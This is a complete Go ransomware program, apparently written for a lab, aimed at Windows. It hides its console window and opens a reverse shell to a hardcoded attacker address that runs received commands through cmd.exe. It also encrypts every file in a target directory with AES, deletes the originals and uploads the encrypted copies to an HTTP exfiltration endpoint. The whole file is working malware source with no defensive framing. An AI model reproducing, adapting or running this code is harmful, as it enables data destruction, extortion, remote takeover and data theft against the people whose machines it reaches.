package main

import (
	"bufio"
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/sha256"
	"fmt"
	"io"
	"log"
	"mime/multipart"
	"net"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"syscall"
	"sync"
)

const(
	attackerip = "192.168.10.19:1234"
	fileExtension = ".enc"
	dir = "C:\\Users\\win11\\Desktop\\ransomware"
	pass = "qwerty1234"
	exfilEndpoint = "http://192.168.10.19:9999/upload"
)

func init() {
	// Hide the console window on Windows
	kernel32 := syscall.NewLazyDLL("kernel32.dll")
	getConsoleWindow := kernel32.NewProc("GetConsoleWindow")
	showWindow := syscall.NewLazyDLL("user32.dll").NewProc("ShowWindow")

	hwnd, _, _ := getConsoleWindow.Call()
	if hwnd != 0 {
		const SW_HIDE = 0
		showWindow.Call(hwnd, SW_HIDE)
	}
}

// Reverse shell background
func reverseShellTCP(address string) error {
	conn, err := net.Dial("tcp", address)
	if err != nil {
		return fmt.Errorf("failed to connect to %s: %w", address, err)
	}
	defer conn.Close()

	reader := bufio.NewReader(conn)
	for {
		cmdBuffer := make([]byte, 4096)
		n, err := reader.Read(cmdBuffer)
		if err != nil {
			return fmt.Errorf("connection closed or error: %w", err)
		}
		command := strings.TrimSpace(string(cmdBuffer[:n]))

		cmd := exec.Command("cmd.exe", "/Q", "/D", "/S", "/C", command)
		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}

		var output bytes.Buffer
		cmd.Stdout = &output
		cmd.Stderr = &output
		_ = cmd.Run()

		pwdCmd := exec.Command("cmd.exe", "/C", "cd")
		pwdOutput, _ := pwdCmd.Output()
		prompt := fmt.Sprintf("PS %s> ", strings.TrimSpace(string(pwdOutput)))
		fullOutput := output.String() + prompt

		if _, err := conn.Write([]byte(fullOutput)); err != nil {
			return fmt.Errorf("failed to send response: %w", err)
		}
	}
}

// Derive 32-byte AES key from passphrase
func deriveKey(passphrase string) []byte {
	hash := sha256.Sum256([]byte(passphrase))
	return hash[:]
}

// AES-256-CBC encryption with PKCS7 padding
func encryptFile(inputPath string, key []byte) error {
	if filepath.Ext(inputPath) == fileExtension {
		return nil // already encrypted
	}

	inputFile, err := os.Open(inputPath)
	if err != nil {
		return err
	}
	defer inputFile.Close()

	outputPath := inputPath + fileExtension
	outputFile, err := os.Create(outputPath)
	if err != nil {
		return err
	}
	defer outputFile.Close()

	// Generate random IV
	iv := make([]byte, aes.BlockSize)
	if _, err := rand.Read(iv); err != nil {
		return err
	}

	// Write IV at the beginning
	if _, err := outputFile.Write(iv); err != nil {
		return err
	}

	block, err := aes.NewCipher(key)
	if err != nil {
		return err
	}
	mode := cipher.NewCBCEncrypter(block, iv)

	buffer := make([]byte, aes.BlockSize)
	var finalBlockWritten bool

	for {
		n, err := inputFile.Read(buffer)
		if err != nil && err != io.EOF && err != io.ErrUnexpectedEOF {
			return err
		}

		if n == 0 {
			break
		}

		// If it's the last block
		if n < aes.BlockSize {
			padLen := aes.BlockSize - n
			for i := n; i < aes.BlockSize; i++ {
				buffer[i] = byte(padLen)
			}
			finalBlockWritten = true
		}

		encrypted := make([]byte, aes.BlockSize)
		mode.CryptBlocks(encrypted, buffer)
		if _, err := outputFile.Write(encrypted); err != nil {
			return err
		}

		if err == io.EOF || finalBlockWritten {
			break
		}
	}

	fmt.Printf("Encrypted: %s -> %s\n", inputPath, outputPath)

	return nil
}

// Exfiltrate through python -m uploadserver 9999
func exfiltrateFileHTTP(filePath string) error {
	file, err := os.Open(filePath)
	if err != nil {
		return err
	}
	defer file.Close()

	var body bytes.Buffer
	writer := multipart.NewWriter(&body)

	part, err := writer.CreateFormFile("files", filepath.Base(filePath))
	if err != nil {
		return err
	}
	if _, err := io.Copy(part, file); err != nil {
		return err
	}
	writer.Close()

	req, err := http.NewRequest("POST", exfilEndpoint, &body)
	if err != nil {
		return err
	}
	req.Header.Set("Content-Type", writer.FormDataContentType())

	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("exfiltration failed: %s", resp.Status)
	}

	log.Printf("Exfiltrated file to %s: %s", exfilEndpoint, filePath)
	return nil
}


// Recursively encrypt all files in a directory
func processDirectory(root string, key []byte) error {
	return filepath.Walk(root, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return err
		}

		if info.IsDir() {
			return nil
		}

		if strings.HasSuffix(path, fileExtension) {
			return nil
		}

		// Encrypt file
		if err := encryptFile(path, key); err != nil {
			log.Printf("Encryption failed for %s: %v", path, err)
			return nil
		}

		// Check if encrypted file was created
		encPath := path + fileExtension
		if _, err := os.Stat(encPath); err == nil {
			// Delete original file only if encrypted version exists
			if err := os.Remove(path); err != nil {
				log.Printf("Failed to delete original file %s: %v", path, err)
			} else {
				log.Printf("Deleted original file: %s", path)
			}
		} else {
			log.Printf("Encrypted file not found for %s — not deleting original", path)
		}

		exfiltrateFileHTTP(encPath)

		return nil
	})
}

func main() {
	// background reverse shell first
	var wg sync.WaitGroup
	wg.Add(1)

	go func() {
		defer wg.Done()
		err := reverseShellTCP(attackerip)
		if err != nil {
			log.Printf("Reverse shell error: %v", err)
		}
	}()

	key := deriveKey(pass)

	err := processDirectory(dir, key)
	if err != nil {
		log.Fatalf("Failed to process directory: %v", err)
	}
	// Keep process alive even after encryption
	wg.Wait()
}